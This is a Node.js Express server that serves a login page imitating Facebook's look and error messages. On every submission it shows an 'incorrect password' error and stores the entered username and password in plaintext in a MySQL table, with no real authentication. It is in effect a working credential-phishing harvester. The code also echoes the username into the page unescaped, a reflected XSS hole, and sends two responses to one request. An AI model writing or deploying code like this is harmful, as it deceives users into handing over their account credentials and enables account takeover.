const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql');

const app = express();
const port = 4000;

// Database connection configuration
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '',
  database: 'auth',
});

// db.connect((error) => {
//   if (error) {
//     console.error('Error connecting to the database:', error);
//   } else {
//     console.log('Connected to the database');
//   }
// });

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static('public'));

// CSS styles
const cssStyles = `
<style>
.error-message {
  color: red;
  font-weight: bold;
}

.success-message {
  color: green;
  font-weight: bold;
}

.login-container {
  height: 100vh;
  background-color: #f5f5f5;
  display: flex;
  justify-content: center;
  align-items: center;
}

.login-form {
  width: 500px;
  padding: 20px;
  background-color: white;
  border-radius: 8px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  display: flex;
  flex-direction: column;
  align-items: stretch;
}

.input-field {
  width: 100%;
  padding: 14px 16px;
  margin-bottom: 10px;
  border: 1px solid #ccc;
  border-radius: 6px;
  box-sizing: border-box;
}

.login-button {
  font-size: 20px;
  width: 100%;
  padding: 0px 16px;
  line-height: 48px;
  background-color: #1877f2;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
}

.error {
  border: 1px solid red;
}

.error-message {
  color: red;
  font-size: 14px;
  margin-top: 5px;
}

.forgot-create-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  margin-top: 10px;
}

.forgot-password {
  color: #1877f2;
}

.create-account-button {
  margin-top: 10px;
  padding: 10px;
  background-color: #42b72a;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.create-page-text {
  display: none;
}

.createPageForBrandLink {
  font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
  font-size: 14px;
  font-weight: 600;
  color: inherit;
  cursor: pointer;
  text-decoration: none;
}

.createPageForBrandLink:hover {
  text-decoration: underline;
}
</style>
`;

app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;

  // Perform validation logic
  let errorMessage = '';

  if (!username || !password) {
    errorMessage = `<p class="error-message">The email or mobile number you entered isn’t connected to an account. The password you’ve entered is incorrect. <a href='rememberPassword'>Forgot password?</a></p>`;
  }else{
    errorMessage = `<p class="error-message">The email or mobile number you entered isn’t connected to an account. The password you’ve entered is incorrect. <a href='rememberPassword'>Forgot password?</a></p>`;
  }

  // Password validation criteria
  if (password && password.length < 8) {
    errorMessage = `<p class="error-message">The email or mobile number you entered isn’t connected to an account. The password you’ve entered is incorrect. <a href='rememberPassword'>Forgot password?</a></p>`;
  }

  if (password && (!/[a-z]/.test(password) || !/[A-Z]/.test(password))) {
    errorMessage = `<p class="error-message">The email or mobile number you entered isn’t connected to an account. The password you’ve entered is incorrect. <a href='rememberPassword'>Forgot password?</a></p>`;
  }

  if (password && !/\d/.test(password)) {
    errorMessage = `<p class="error-message">The email or mobile number you entered isn’t connected to an account. The password you’ve entered is incorrect. <a href='rememberPassword'>Forgot password?</a></p>`;
  }

  if (password && !/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
    errorMessage = `<p class="error-message">The email or mobile number you entered isn’t connected to an account. The password you’ve entered is incorrect. <a href='rememberPassword'>Forgot password?</a></p>`;
  }

  // Add additional validation criteria if needed


    // Display the error message if there is an error
    res.send(`${cssStyles}
      <div class="login-container">
        <form class="login-form" action="/login" method="POST">
          <input type="text" class="input-field ${!username ? 'error' : ''}" id='username' name="username" placeholder="Email or Phone number" value="${username || ''}" required/>
          <input type="password" class="input-field ${!password ? 'error' : ''}" id='password' name="password" placeholder="Password" required/>
          <div>${errorMessage}</div>
          <button type="submit" class="login-button">Log In</button>
          <div class="forgot-create-container">
            <div class="forgot-password">Forgot password?</div>
            <button type="button" class="create-account-button">Create New Account</button>
          </div>
        </form>
        <div class="create-page-text">
          <a href='' class='createPageForBrandLink'>Create a Page</a> for a celebrity, brand, or business.
        </div>
      </div>
    `);
 
    // If there are no errors, save the data to the database
    const sql = 'INSERT INTO users (username, password) VALUES (?, ?)';
    db.query(sql, [username, password], (error, result) => {
      if (error) {
        console.error('Error saving data to the database:', error);
        // Display an error message if there is an issue with the database
        res.send(`<p class="error-message">An error occurred. Please try again later.</p>`);
      } else {
        // Display a success message if the data is saved successfully
        res.send(`${cssStyles}
          <div class="login-container">
            <p class="success-message">Login successful!</p>
          </div>
        `);
      }
    });
  }
);

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
